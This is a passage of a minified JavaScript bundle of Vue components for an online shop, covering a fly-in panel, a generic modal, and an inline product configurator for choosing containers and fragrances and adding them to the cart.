r=e("vue"),i=e("./flyin/flyin.vue"),a="#flyin-app",o="#flyin",s={init:function(){document.querySelectorAll(".js-flyin-trigger").forEach((function(e){e.addEventListener("click",(function(){window.eventBus.$emit("shouldOpenFlyin",{content:'<div class="generic-flyout-header">Add markup here</div>',callback:function(){}})}),!1)})),document.addEventListener("keyup",(function(e){"Escape"===e.code&&window.eventBus.$emit("shouldCloseFlyin")})),window.eventBus=window.eventBus||new r,window.eventBus.$on("shouldOpenFlyin",(function(e){(function(e){return document.querySelector([o,e].join(""))})(e.id)||(function(){var e='<div id="'.concat(a.substring(1),'" />');document.querySelector("body").insertAdjacentHTML("beforeend",e)}(e.id),function(e){new r({el:a,store:e.store,components:{Flyin:i},computed:{config:function(){return e}},template:'<flyin :config="config" />'})}(e))})),window.eventBus.$on("flyinOpened",(function(e){e.callback&&"function"==typeof e.callback&&e.callback()})),window.eventBus.$on("flyinClosed",(function(e){!function(e){var t=document.querySelector([o,e].join(""));t&&t.parentNode.removeChild(t)}(e)}))}};t.exports=s},{"./flyin/flyin.vue":378,vue:279}],378:[function(e,t,n){t.exports={name:"flyin",props:{config:{type:Object,default:function(){return{}}}},methods:{shouldOpen:function(){var e=this;this.showBackdrop=!0,this.cssClasses.push("open"),setTimeout((function(){e.setFocus(),window.eventBus.$emit("flyinOpened",e.config)}),500)},shouldClose:function(){var e=this;this.disableInterface||(this.showBackdrop=!1,this.cssClasses=this.cssClasses.filter((function(e){return"open"!==e})),setTimeout((function(){window.eventBus.$emit("flyinClosed",e.config.id)}),500))},setFocus:function(){this.$refs.flyinDialog.focus()}},computed:{resources:function(){return{close:window.Resources.CLOSE}},content:function(){return this.config.content},properties:function(){return this.config.props}},mounted:function(){var e=this;setTimeout((function(){e.shouldOpen()}),20),window.eventBus.$on("shouldCloseFlyin",(function(){e.shouldClose()})),window.eventBus.$on("processingPayment",(function(t){e.disableInterface=!t}))},data:function(){return{cssClasses:["generic-dialog-flyout"],showBackdrop:!1,disableInterface:!1}}},t.exports.__esModule&&(t.exports=t.exports.default);var r,i="function"==typeof t.exports?t.exports.options:t.exports;i.functional,i.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{attrs:{id:"flyin"+(e.config.id||"")}},[n("div",{ref:"flyinDialog",class:e.cssClasses},[n("span",{staticClass:"sr-only flyout-sr-only",attrs:{tabindex:"0","aria-hidden":"true"}}),e._v(" "),n("button",{directives:[{name:"show",rawName:"v-show",value:!e.disableInterface,expression:"!disableInterface"}],ref:"flyinCloseButton",staticClass:"side--close icon-close",attrs:{type:"button",tabindex:"0"},on:{click:e.shouldClose}},[n("span",{staticClass:"sr-only"},[e._v(e._s(e.resources.close))])]),e._v(" "),n("section",{staticClass:"generic-flyout-content flyin-component"},[n(e.content,e._b({tag:"component",on:{close:e.shouldClose}},"component",e.properties,!1))],1)]),e._v(" "),n("transition",{attrs:{name:"backdrop-transition"}},[n("div",{directives:[{name:"show",rawName:"v-show",value:e.showBackdrop,expression:"showBackdrop"}],staticClass:"modal-overlay flyin-component",on:{click:e.shouldClose}})])],1)},i.staticRenderFns=[],t.hot&&((r=e("vue-hot-reload-api")).install(e("vue"),!0),r.compatible&&(t.hot.accept(),t.hot.data?r.reload("data-v-5a1864a8",i):r.createRecord("data-v-5a1864a8",i)))},{vue:279,"vue-hot-reload-api":275}],379:[function(e,t,n){var r=e("vue"),i=e("./modal/modal.vue"),a={init:function(){window.eventBus=window.eventBus||new r,window.eventBus.$on("shouldOpenModal",(function(e){$("body").append('\n        <div id="app-modal">\n        </div>\n    '),function(e){new r({el:"#app-modal",store:e.store,components:{Modal:i},computed:{config:function(){return e}},data:function(){return{shouldShowModal:!0}},template:'<modal :config = "config"></modal>'})}(e)})),window.eventBus.$on("modalClosed",(function(){$("#modal").remove()}))}};t.exports=a},{"./modal/modal.vue":380,vue:279}],380:[function(e,t,n){var r,i,a;r=e("../../../modules/helpers/isMobileDevice"),i=e("../../../modules/helpers/scroll"),a=e("../../../validator"),t.exports={name:"modal",props:{config:Object},methods:{handleCloseModal:function(e){if(!e.closeElement||e.closeElement.shouldCloseModal)return e.closeElement&&e.closeElement.eventName&&this.onElementClick(e.closeElement.eventName,e.closeElement.data),void this.closeModal();this.onElementClick(e.closeElement.eventName,e.closeElement.data)},closeModal:function(){this.isModalVisible=!1},onElementClick:function(e,t){window.eventBus.$emit(e,t)},validatePersonalizedName:function(e){return e&&e.replace(/\s/g,"")?a.validatePersonalizedName(e)?(this.msg.personalizedName="",void(this.invalid=!1)):(this.msg.personalizedName=this.config.resources.error,void(this.invalid=!0)):(this.msg.personalizedName="",void(this.invalid=!0))}},watch:{isModalVisible:function(e){var t=this;!0===e?(window.eventBus.$emit("modalOpen"),i.disableScroll(),$(".js-flyout-container").hasClass("open")&&$(".generic-modal-container").addClass("flyout-open")):(i.enableScroll(),setTimeout((function(){window.eventBus.$emit("modalClosed")}),800)),setTimeout((function(){!0===e&&t.isMobile&&t.config.shouldModalCloseOnMobile&&(t.isModalVisible=!1)}),3e3)},personalizedName:function(e){this.personalizedName=e,this.validatePersonalizedName(e)}},computed:{content:function(){return this.config.content},properties:function(){return this.config.props},modalResources:function(){return{closeModal:window.Resources.CLOSE_MODAL||"Close"}},isDisabled:function(){return this.invalid},enableDraglist:function(){return!this.config.hasOwnProperty("enableDraglist")||this.config.enableDraglist}},mounted:function(){var e=this;this.isModalVisible=!0,this.config.mountedEvent&&window.eventBus.$emit(this.config.mountedEvent),window.eventBus.$on("shouldCloseModal",(function(){e.handleCloseModal(e.config)}))},data:function(){return{isMobile:r(),isModalVisible:!1,personalizedName:"",msg:[],invalid:!0}}},t.exports.__esModule&&(t.exports=t.exports.default);var o,s="function"==typeof t.exports?t.exports.options:t.exports;s.functional,s.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"modal",attrs:{id:"modal"}},[n("transition",{attrs:{name:"generic-modal-transition"}},[n("div",{directives:[{name:"show",rawName:"v-show",value:e.isModalVisible,expression:"isModalVisible"}],staticClass:"generic-modal-container",class:[{"modal-large":e.config.modalLarge,"centered-on-mobile":e.config.centerOnMobile,"modal-full-width":e.config.modalFullWidth,"talisman-certificate":e.config.certificateEdit,"easter-modal":e.config.easterModal,"generic-modal-container-small":e.config.modalSmall,"qr-modal":e.config.qrModal},e.config.customClass]},[n("div",{staticClass:"content-wrapper"},[e.config.hideCloseButton?e._e():n("button",{staticClass:"close-modal icon-close modal-close-icon",on:{click:function(){return e.handleCloseModal(e.config)}}},[n("span",{staticClass:"sr-only"},[e._v(e._s(e.modalResources.closeModal))])]),e._v(" "),e.content?n(e.content,e._b({tag:"component"},"component",e.properties,!1)):n("div",[e.config.productImage&&e.config.productImage.src?n("div",{staticClass:"image-holder"},[n("img",{class:e.config.productImage.class,attrs:{"data-src":e.config.productImage.src,alt:e.config.productImage.alt,src:e.config.productImage.placeholder}})]):e._e(),e._v(" "),e.config.icon?n("span",{class:e.config.icon}):e._e(),e._v(" "),n("div",{staticClass:"text-holder"},[e.config.resources&&e.config.resources.heading?n("h2",{staticClass:"heading-h4",class:{"heading-large":e.config.resources&&e.config.resources.headingLarge,"heading-small":e.config.resources&&e.config.resources.headingSmall,"heading-large-narrow":e.config.resources&&e.config.resources.headingNarrow},domProps:{innerHTML:e._s(e.config.resources.heading)}}):e._e(),e._v(" "),e._l(e.config.paragraphs,(function(t){return[t&&t.text&&!e.config.certificateEdit?n("p",{class:{"text-large":t.textLarge,"text-color-black":t.textColorBlack,"text-width-limiter":t.textWidthLimiter},domProps:{innerHTML:e._s(t.text)}}):e._e()]}))],2),e._v(" "),e.config.easterModal?n("div",[n("img",{staticClass:"qr-code-easter",attrs:{src:e.config.QRcodeURL,alt:""}}),e._v(" "),n("p",{staticClass:"qr-code-phara",domProps:{innerHTML:e._s(e.config.resources.description)}})]):e._e(),e._v(" "),e.config.qrModal?n("div",[n("img",{staticClass:"js-qrCode qr-code",attrs:{src:e.config.QRcodeURL,alt:""}}),e._v(" "),n("p",{staticClass:"js-qr-description qr-code-phara",domProps:{innerHTML:e._s(e.config.description)}})]):e._e(),e._v(" "),e.config.certificateEdit?n("div",{staticClass:"talisman-certificate-content",attrs:{id:"talisman-certificate-content"}},[n("p",{domProps:{innerHTML:e._s(e.config.resources.description)}}),e._v(" "),n("label",{attrs:{for:"personalizedName"}},[e._v(e._s(e.config.resources.name))]),e._v(" "),e.msg.personalizedName?n("span",{staticClass:"error"},[e._v(e._s(e.msg.personalizedName))]):e._e(),e._v(" "),n("input",{directives:[{name:"model",rawName:"v-model",value:e.personalizedName,expression:"personalizedName"}],attrs:{id:"personalizedName",type:"text",maxlength:"12",placeholder:e.config.resources.placeholder},domProps:{value:e.personalizedName},on:{input:function(t){t.target.composing||(e.personalizedName=t.target.value)}}}),e._v(" "),n("p",{staticClass:"disclaimer",domProps:{innerHTML:e._s(e.config.resources.note)}})]):e._e(),e._v(" "),e.config.productTiles?n("div",{staticClass:"bonus-product-list-slider drag-list",attrs:{id:"bonus-product-list","data-line-item-detail":e.config.configuration&&e.config.configuration.lidata}},[n("div",{class:["drag-list-scroll",{"js-drag-list js-drag-list-center":e.enableDraglist}],attrs:{"data-list-config":'{"itemsToShow":"1.5","hideArrows":true, "hideBar":true, "isMobileOnly": true}'}},[e._l(e.config.productTiles,(function(t){return[n("div",{class:["bonus-product-list-slider-item",{"js-drag-list-item":e.enableDraglist}],attrs:{id:t.id,"data-producttype":t.productType}},[n("label",{attrs:{id:t.popupProductID}},[n("input",{staticClass:"gwp-radio--hidden js-bonus-product-selection",attrs:{type:"radio",name:"popup-bonus-product-select","data-pid":t.productID,"data-productuuid":t.productUUID,"data-bonusdiscountlineitemuuid":t.bonusDiscountLineItemUUID,"data-bonusproductid":t.bonusProductID},domProps:{checked:t.bonusProductID==t.productID}}),e._v(" "),t&&t.productName?n("span",{staticClass:"product-name",domProps:{innerHTML:e._s(t.productName)}}):e._e(),e._v(" "),t&&t.productImageUrl?n("div",{staticClass:"product-image"},[n("img",{class:t.productImageClass,attrs:{"data-src":t.productImageUrl,alt:t.productImageAlt,title:t.productImageTitle,src:t.productImagePlaceholder}})]):e._e(),e._v(" "),n("div",{staticClass:"select-box-wrapper"},[n("span",{staticClass:"gwp-select-box",attrs:{"aria-labelledby":t.popupProductID,tabindex:"0",role:"radio","aria-checked":t.bonusProductID==t.productID}})])])])]}))],2)]):e._e(),e._v(" "),n("div",{staticClass:"cta-holder",class:{"cta-holder-row":e.config.ctaHolderRow,"hide-on-mobile-and-tablet":e.config.ctaHolder.hideOnMobileAndTablet}},[e._l(e.config.buttons,(function(t){return[t&&t.label?n("div",{staticClass:"row row-custom-width",class:e.config.row&&e.config.row.rowWidth},[t&&t.prependedBlock?n("div",{staticClass:"flag-wrapper",domProps:{innerHTML:e._s(t.prependedBlock)}}):e._e(),e._v(" "),n("button",{class:t.type,attrs:{type:"button",disabled:e.isDisabled&&t.shouldBeValid},domProps:{innerHTML:e._s(t.label)},on:{click:function(n){t.shouldCloseModal?t.eventName?!e.onElementClick(t.eventName,t.data)&&e.closeModal():e.closeModal():e.onElementClick(t.eventName,t.data)}}})]):e._e()]}))],2),e._v(" "),e.config.configuration&&e.config.configuration.verificationMessage?n("p",{staticClass:"verification-message",domProps:{innerHTML:e._s(e.config.configuration.verificationMessage)}}):e._e(),e._v(" "),e.config.configuration&&e.config.configuration.fixedTierStep?n("input",{staticClass:"js-gwp-tier-step",attrs:{type:"hidden"},domProps:{value:e.config.configuration.fixedTierStep}}):e._e()])],1)])]),e._v(" "),n("transition",{attrs:{name:"generic-modal-overlay-transition"}},[n("div",{directives:[{name:"show",rawName:"v-show",value:e.isModalVisible,expression:"isModalVisible"}],staticClass:"generic-modal-overlay",on:{click:function(){return e.handleCloseModal(e.config)}}})])],1)},s.staticRenderFns=[],t.hot&&((o=e("vue-hot-reload-api")).install(e("vue"),!0),o.compatible&&(t.hot.accept(),t.hot.data?o.reload("data-v-408b206b",s):o.createRecord("data-v-408b206b",s)))},{"../../../modules/helpers/isMobileDevice":484,"../../../modules/helpers/scroll":493,"../../../validator":624,vue:279,"vue-hot-reload-api":275}],381:[function(e,t,n){var r=e("../../modules/google").tagManager;t.exports={computed:{customerSelectedContainer:function(){return this.$store.getters.customerSelectedContainer},customerSelectedFiller:function(){return this.$store.getters.customerSelectedFiller},productCollection:function(){return this.$store.getters.productData.collection},productSelection:function(){return[this.customerSelectedContainer,this.customerSelectedFiller].filter(Boolean).map((function(e){return e.name})).join("/")}},methods:{handleStepInteraction:function(e){if(e){var t={event:"configurator",sublevel_1:"in-page",sublevel_2:this.productCollection,click_target:e};this.customerSelectedFiller&&(t.content_group=this.customerSelectedFiller.categoryName),this.productSelection&&(t.selection=this.productSelection),r.pushDataLayerEvent(t)}}}}},{"../../modules/google":474}],382:[function(e,t,n){var r,i,a,o;r=e("../overlay/overlay.vue"),i=e("../slider-controls/slider-controls.vue"),a=e("../../../modules/helpers/debounce"),o=e("../analytics.js"),t.exports={name:"fragrance-slider",mixins:[o],components:{Overlay:r,SliderControls:i},props:{desktopMode:Boolean},methods:{nextScreen:function(){this.$emit("clickContinuFragranceSlider"),this.$store.commit("setUserConfiguration",["filler",this.selectedPart]),this.handleStepInteraction("done"),window.eventBus.$emit("configuratorChanged",this.userConfiguration)},previousScreen:function(){this.$emit("clickReturnSelectedProduct")},openOverlay:function(e,t){var n=this.part.categories[e].options[t];this.overlayHeading=n.name,this.overlayBody=n.description.split("||"),this.showOverlay=!0},closeOverlay:function(){this.showOverlay=!1},selectPart:function(e,t){var n=this.part.categories[e].options[t];n.available&&this.$store.commit("setUserConfiguration",["filler",n.id]),this.$emit("selectFragrance",n.name),this.selectedPart=n.id,this.partAvailable=n.available},selectCategory:function(e){var t=this,n=document.querySelectorAll(".fragrance-options")[e].getBoundingClientRect(),r=document.querySelector(".fragrances-scroll-body");this.scrollTo(n.left-r.getBoundingClientRect().left),this.selectedCategory=e,this.muteObserver=!0,setTimeout((function(){t.muteObserver=!1}),400)},selectCategoryOfPart:function(e){var t,n=0,r=!1,i=_createForOfIteratorHelper(this.part.categories.entries());try{for(i.s();!(t=i.n()).done;){var a,o=_slicedToArray(t.value,2),s=o[0],l=_createForOfIteratorHelper(o[1].options.entries());try{for(l.s();!(a=l.n()).done;){var c=_slicedToArray(a.value,2),u=c[0];if(c[1].id===e){this.selectedPartIdx=u,n=s,r=!0;break}}}catch(e){l.e(e)}finally{l.f()}if(r)break}}catch(e){i.e(e)}finally{i.f()}return n},scrollTo:function(e){document.querySelector(".fragrances-scroll-body").scrollLeft+=e},onFragranceScroll:function(e){var t=e.target,n=t.scrollWidth,r=t.scrollLeft,i=t.offsetWidth;this.showRightArrow=r+i<n,this.showLeftArrow=0<r},onClickArrow:function(e){if(this.scrollByCategory){var t=this.part.categories.length-1,n=0===this.selectCategory?t:this.selectedCategory-1,r=this.selectCategory===t?0:this.selectedCategory+1;this.selectCategory("left"===e?n:r)}else{var i=document.querySelector(".options li").getBoundingClientRect(),a=window.getComputedStyle(document.querySelector(".options li")),o=parseInt(a.marginLeft)+parseInt(a.marginRight),s=this.itemsToScroll*(i.width+o);this.scrollTo("left"===e?-1*s:s)}},initObserver:function(){var e=this,t=new IntersectionObserver((function(t){var n,r=_createForOfIteratorHelper(t);try{for(r.s();!(n=r.n()).done;){var i=n.value;if(("ontouchstart"in window?i.isIntersecting:1===i.intersectionRatio)&&!1===e.muteObserver){var a=i.target;e.selectedCategory=_toConsumableArray2(a.parentElement.children).indexOf(a);break}}}catch(t){r.e(t)}finally{r.f()}}),{threshold:[.25,.5,.75,1]});document.querySelectorAll(".fragrance-options").forEach((function(e){t.observe(e)}))}},computed:{indicatorLeft:function(){var e=document.querySelector(".fragrance-categories"),t=document.querySelectorAll(".fragrance-categories li")[this.selectedCategory],n=e?e.offsetLeft:0;return t?t.getBoundingClientRect().left-e.getBoundingClientRect().x+n:n},indicatorWidth:function(){var e=document.querySelectorAll(".fragrance-categories li")[this.selectedCategory];return e?e.getBoundingClientRect().width:100},userConfiguration:function(){return this.$store.getters.userConfiguration},resources:function(){return this.$store.getters.resources},part:function(){return this.$store.getters.fillerPart()}},mounted:function(){var e=this;this.selectedPart=this.userConfiguration.filler||this.part.selected,this.selectedCategory=this.selectCategoryOfPart(this.selectedPart),this.partAvailable=this.part.categories[this.selectedCategory].options[this.selectedPartIdx].available,setTimeout((function(){e.skipIndicatorAnimation=!1}),300),"IntersectionObserver"in window&&this.initObserver(),this.desktopMode&&document.querySelector(".fragrances-scroll-body").addEventListener("scroll",a(this.onFragranceScroll,10))},data:function(){return{itemsToScroll:3,muteObserver:!1,overlayBody:[],overlayHeading:"",partAvailable:!1,scrollByCategory:!0,selectedCategory:null,selectedPart:null,selectedPartIdx:null,showLeftArrow:!1,showOverlay:!1,showRightArrow:!0,skipIndicatorAnimation:!0}}},t.exports.__esModule&&(t.exports=t.exports.default);var s,l="function"==typeof t.exports?t.exports.options:t.exports;l.functional,l.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"fragrance-slider"},[n("overlay",{directives:[{name:"show",rawName:"v-show",value:e.showOverlay,expression:"showOverlay"}],on:{onClickClose:function(t){return e.closeOverlay()}}},[n("h1",[e._v(e._s(e.overlayHeading))]),e._v(" "),e._l(e.overlayBody,(function(t){return n("p",[e._v(e._s(t))])}))],2),e._v(" "),n("div",{staticClass:"fragrance-header"},[n("span",{class:["icon",e.part.icon]}),e._v(" "),n("h3",[e._v(e._s(e.resources.screens.fragrance.heading))])]),e._v(" "),n("ul",{staticClass:"fragrance-categories"},e._l(e.part.categories,(function(t,r){return n("li",{class:{selected:e.selectedCategory===r}},[n("a",{attrs:{href:"javascript:void(0);"},on:{click:function(t){return e.selectCategory(r)}}},[n("span",{staticClass:"category-name"},[e._v(e._s(t.name))])])])})),0),e._v(" "),n("div",{class:["category-indicator",{"skip-animation":e.skipIndicatorAnimation}],style:"left: "+e.indicatorLeft+"px; width: "+e.indicatorWidth+"px;"}),e._v(" "),n("div",{class:["category-fragrances",{"gradient-left":!e.showRightArrow},{"gradient-right":e.showRightArrow}]},[n("div",{staticClass:"fragrances-scroll-body"},e._l(e.part.categories,(function(t,r){return n("div",{staticClass:"fragrance-options"},[n("h4",{staticClass:"category-name"},[e._v(e._s(t.name))]),e._v(" "),n("ul",{staticClass:"options"},e._l(t.options,(function(t,i){return n("li",{class:{selected:e.selectedPart===t.id},on:{click:function(t){return e.selectPart(r,i)}}},[n("a",{attrs:{href:"javascript:void(0)"}},[t.available?e._e():n("span",{staticClass:"error-message"},[n("span",{staticClass:"error-badge"}),e._v("\n                                "+e._s(e.resources.global.notInStockShort)+"\n                            ")]),e._v(" "),n("span",{staticClass:"icon icon-seal"}),e._v(" "),n("span",{staticClass:"option-name"},[e._v(e._s(t.name))]),e._v(" "),n("span",{staticClass:"option-excerpt"},[e._v(e._s(t.excerpt))]),e._v(" "),n("span",{staticClass:"option-more",on:{click:function(t){return e.openOverlay(r,i)}}},[e._v(e._s(e.resources.global.readMore))])])])})),0)])})),0)]),e._v(" "),n("slider-controls",{attrs:{showLeftArrow:e.showLeftArrow,showRightArrow:e.showRightArrow},on:{clickArrowLeft:function(t){return e.onClickArrow("left")},clickArrowRight:function(t){return e.onClickArrow("right")}}}),e._v(" "),n("div",{staticClass:"fragrance-footer"},[e.desktopMode?e._e():n("button",{staticClass:"btn btn-customize btn--secondary",attrs:{type:"button"},on:{click:function(t){return e.previousScreen()}}},[n("span",{staticClass:"icon icon-arrow3--left"}),e._v(" "),n("span",{staticClass:"sr-only"},[e._v(e._s(e.resources.screens.fragrance.buttonChangeProduct))])]),e._v(" "),n("button",{staticClass:"btn btn-customize",attrs:{type:"button",disabled:!e.partAvailable},on:{click:function(t){return e.nextScreen()}}},[e._v("\n            "+e._s(e.resources.screens.fragrance.buttonDone)+"\n        ")])])],1)},l.staticRenderFns=[],t.hot&&((s=e("vue-hot-reload-api")).install(e("vue"),!0),s.compatible&&(t.hot.accept(),t.hot.data?s.reload("data-v-93d37156",l):s.createRecord("data-v-93d37156",l)))},{"../../../modules/helpers/debounce":476,"../analytics.js":381,"../overlay/overlay.vue":383,"../slider-controls/slider-controls.vue":393,vue:279,"vue-hot-reload-api":275}],383:[function(e,t,n){t.exports={name:"overlay",methods:{onClickClose:function(){this.$emit("onClickClose")}}},t.exports.__esModule&&(t.exports=t.exports.default);var r,i="function"==typeof t.exports?t.exports.options:t.exports;i.functional,i.render=function(){var e=this.$createElement,t=this._self._c||e;return t("transition",{attrs:{name:"overlay-transition"}},[t("div",{directives:[{name:"show",rawName:"v-show",value:this.shouldShow,expression:"shouldShow"}],staticClass:"overlay"},[t("div",{staticClass:"overlay-slot"},[t("div",{staticClass:"overlay-body"},[this._t("default")],2)]),this._v(" "),t("button",{staticClass:"overlay-close",on:{click:this.onClickClose}},[t("span",{staticClass:"icon icon-close-thick"})])])])},i.staticRenderFns=[],t.hot&&((r=e("vue-hot-reload-api")).install(e("vue"),!0),r.compatible&&(t.hot.accept(),t.hot.data?r.reload("data-v-688b8f57",i):r.createRecord("data-v-688b8f57",i)))},{vue:279,"vue-hot-reload-api":275}],384:[function(e,t,n){var r=e("vue"),i=e("vuex"),a=e("./product-configurator-inline-store"),o=".js-product-configurator-inline",s={init:function(){var t;0<document.querySelectorAll(o).length&&(r.use(i),window.eventBus=window.eventBus||new r,window.eventBus.$on("configuratorChanged",(function(e){})),document.querySelectorAll(o).forEach((function(t){var n,o,s,l;n=t,o=e("./product-configurator-inline/product-configurator-inline.vue"),s=a.init(i),l=JSON.parse(n.dataset.configuration),new r({el:n,store:s,components:{ProductConfiguratorInline:o},props:{inView:Boolean},computed:{placeholderId:function(){return l.placeholderId.toString()},collectionId:function(){return l.collectionId}},template:'\n            <product-configurator-inline\n                :inView="inView"\n                :placeholderId="placeholderId"\n                :collectionId="collectionId">\n            </product-configurator-inline>\n        '})})),t=new IntersectionObserver((function(e){var t,n=_createForOfIteratorHelper(e);try{for(n.s();!(t=n.n()).done;){var r=t.value,i=r.boundingClientRect.y,a=parseInt(r.target.dataset.previousY)||0,o=parseInt(r.target.dataset.ratioPass)||1;i<a?1===o&&(r.target.__vue__.$root.inView=!0):2===o&&(r.target.__vue__.$root.inView=!1),.2<r.intersectionRatio&&(o=2===o?1:2),r.target.setAttribute("data-previous-y",i),r.target.setAttribute("data-ratio-pass",o)}}catch(e){n.e(e)}finally{n.f()}}),{threshold:[.6]}),document.querySelectorAll(".product-configurator-inline").forEach((function(e){t.observe(e)})))}};t.exports=s},{"./product-configurator-inline-store":385,"./product-configurator-inline/product-configurator-inline.vue":386,vue:279,vuex:281}],385:[function(e,t,n){var r=e("vue"),i={init:function(e){var t={parts:function(e){return e.parts},resources:function(e){return e.resources},productData:function(e){return e.productData},userConfiguration:function(e){return e.userConfiguration},partById:function(e){return function(t){return e.parts.find((function(e){return e.id===t}))}},containerPart:function(e){return function(){return e.parts.find((function(e){return"options"in e}))}},fillerPart:function(e){return function(){return e.parts.find((function(e){return!("options"in e)}))}},customerSelectedContainer:function(e,t){var n=t.containerPart(),r=e.userConfiguration.container;return r&&n?n.options.find((function(e){return e.id===r})):null},customerSelectedFiller:function(e,t){var n=t.fillerPart(),r=e.userConfiguration.filler;if(!r||!n)return null;for(var i=0,a=Object.values(n.categories);i<a.length;i++)for(var o=a[i],s=0,l=Object.values(o.options);s<l.length;s++){var c=l[s];if(c.id===r)return _objectSpread({categoryName:o.name},c)}}},n={setParts:function(e,t){e.parts=t},setResources:function(e,t){e.resources=t},setProductData:function(e,t){e.productData=t},setUserConfiguration:function(e,t){r.set(e.userConfiguration,t[0],t[1])}};return new e.Store({state:{parts:{},resources:{},productData:{},userConfiguration:{}},getters:t,mutations:n})}};t.exports=i},{vue:279}],386:[function(e,t,n){var r,i,a,o,s,l,c;r=e("../product-showcase/product-showcase.vue"),i=e("../product-description/product-description.vue"),a=e("../product-slider/product-slider.vue"),o=e("../selected-product/selected-product.vue"),s=e("../fragrance-slider/fragrance-slider.vue"),l=e("../result-slider/result-slider.vue"),c=e("axios"),t.exports={name:"product-configurator-inline",components:{ProductShowcase:r,ProductDescription:i,ProductSlider:a,SelectedProduct:o,FragranceSlider:s,ResultSlider:l},props:{inView:Boolean,placeholderId:String,collectionId:String},methods:{continuTo:function(e){this.showScreenIntro="intro"===e,this.showScreenSelection="selection"===e,this.showScreenFragrance="fragrance"===e,this.showScreenResult="result"===e},returnTo:function(e){var t=this;this.revertTransition=!0,setTimeout((function(){t.continuTo(e)}),50),setTimeout((function(){t.revertTransition=!1}),1600)},onResize:function(){this.desktopMode=1023<window.innerWidth,this.tabletMode=767<window.innerWidth&&window.innerWidth<1023,this.mobileMode=window.innerWidth<767},onPartSelection:function(e){this.selectedPartName=e.name,this.selectedPartImage=e.image},onFragranceSelection:function(e){this.selectedFragranceName=e},setInitialFragranceName:function(){for(var e=this.$store.getters.partById("fragrance")||this.$store.getters.partById("wax"),t=0,n=Object.values(e.categories);t<n.length;t++)for(var r=n[t],i=0,a=Object.values(r.options);i<a.length;i++){var o=a[i];if(o.id===e.selected)return o.name}}},computed:{queryParams:function(){return{placeholderId:this.placeholderId,collectionId:this.collectionId}}},created:function(){window.addEventListener("resize",this.onResize)},destroyed:function(){window.removeEventListener("resize",this.onResize)},mounted:function(){var e=this;this.onResize(),c.get(this.dataUrl,{timeout:1e4,params:this.queryParams}).then((function(t){e.$store.commit("setResources",t.data.resources),e.$store.commit("setParts",t.data.parts),e.$store.commit("setProductData",t.data.productData),e.selectedFragranceName=e.setInitialFragranceName()})).then((function(){e.dataReady=!0})).catch((function(e){}))},data:function(){return{dataReady:!1,dataUrl:Urls.getInLineConfiguratorData,desktopMode:!0,tabletMode:!1,mobileMode:!1,revertTransition:!1,selectedFragranceName:"",selectedPartImage:"",selectedPartName:"",showScreenFragrance:!1,showScreenIntro:!0,showScreenResult:!1,showScreenSelection:!1}}},t.exports.__esModule&&(t.exports=t.exports.default);var u,d="function"==typeof t.exports?t.exports.options:t.exports;d.functional,d.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"product-configurator-inline"},[n("transition",{attrs:{name:"screen-transition",mode:"out-in"}},[e.showScreenIntro&&e.dataReady?n("div",{key:"screenIntro",class:["screen","screen-intro",{reverted:e.revertTransition}]},[n("product-showcase",{attrs:{inView:e.inView,desktopMode:e.desktopMode}}),e._v(" "),n("product-description",{on:{clickContinueIntro:function(t){return e.continuTo("selection")}}})],1):e._e(),e._v(" "),e.showScreenSelection?n("div",{key:"screenSelection",class:["screen","screen-selection",{reverted:e.revertTransition}]},[n("product-slider",{attrs:{desktopMode:e.desktopMode},on:{selectPart:e.onPartSelection,clickContinuSelection:function(t){return e.continuTo("fragrance")}}})],1):e._e(),e._v(" "),e.showScreenFragrance?n("div",{key:"screenFragrance",class:["screen","screen-fragrance",{reverted:e.revertTransition}]},[n("selected-product",{attrs:{desktopMode:e.desktopMode,partName:e.selectedPartName,productImage:e.selectedPartImage,fragranceName:e.selectedFragranceName},on:{clickReturnSelectedProduct:function(t){return e.returnTo("selection")}}}),e._v(" "),n("fragrance-slider",{attrs:{desktopMode:e.desktopMode},on:{selectFragrance:e.onFragranceSelection,clickReturnSelectedProduct:function(t){return e.returnTo("selection")},clickContinuFragranceSlider:function(t){return e.continuTo("result")}}})],1):e._e(),e._v(" "),e.showScreenResult?n("div",{key:"screenResult",class:["screen","screen-result",{reverted:e.revertTransition}]},[n("result-slider",{attrs:{mobileMode:e.mobileMode},on:{clickReturnResultSlider:function(t){return e.returnTo("selection")}}}),e._v(" "),n("product-description",{attrs:{hideParagraph:e.mobileMode,isResultScreen:!0}})],1):e._e()])],1)},d.staticRenderFns=[],t.hot&&((u=e("vue-hot-reload-api")).install(e("vue"),!0),u.compatible&&(t.hot.accept(),t.hot.data?u.reload("data-v-e5df3546",d):u.createRecord("data-v-e5df3546",d)))},{"../fragrance-slider/fragrance-slider.vue":382,"../product-description/product-description.vue":387,"../product-showcase/product-showcase.vue":389,"../product-slider/product-slider.vue":390,"../result-slider/result-slider.vue":391,"../selected-product/selected-product.vue":392,axios:7,vue:279,"vue-hot-reload-api":275}],387:[function(e,t,n){var r,i,a;r=e("axios"),i=e("../../../pages/product/addToCart"),a=e("../analytics.js"),t.exports={name:"product-description",mixins:[a],props:{isResultScreen:{type:Boolean,default:!1},hideParagraph:{type:Boolean,default:!1}},methods:{nextScreen:function(){this.handleStepInteraction("customize"),this.$emit("clickContinueIntro")},setCustomisedProps:function(){for(var e=0,t=Object.values(this.container.options);e<t.length;e++){var n=t[e];n.id===this.userConfiguration.container&&($(".js-product-image-mobile").attr("data-src",n.image.src),this.customizedUsp.push({icon:"icon-ruler",label:n.productDimensions.dimensions}))}for(var r=0,i=Object.values(this.filler.categories);r<i.length;r++)for(var a=i[r],o=0,s=Object.values(a.options);o<s.length;o++){var l=s[o];l.id===this.userConfiguration.filler&&(this.customizedHeading=l.title,this.customizedUsp.push({icon:"icon-size",label:l.productUnit},{icon:"icon-duration",label:l.duration}))}},redirectToPDP:function(){this.handleStepInteraction("details");var e=this.resources.screens.result.detailsURLQueryPrefix+"-"+this.userConfiguration.filler+"-"+this.userConfiguration.container;location.href=this.resources.screens.result.detailsURLBase+"?configurationId="+e+"&showbacklink=true"},addToCart:function(){var e=window.Urls.addProduct.toString()||"";r.post(e,{},{params:{pid:this.productData.masterProductId,childPids:this.userConfiguration.filler+","+this.userConfiguration.container}}).then((function(e){i.updateMiniCartOnAddProduct(e.data,!1)}))}},computed:{userConfiguration:function(){return this.$store.getters.userConfiguration},productData:function(){return this.$store.getters.productData},resources:function(){return 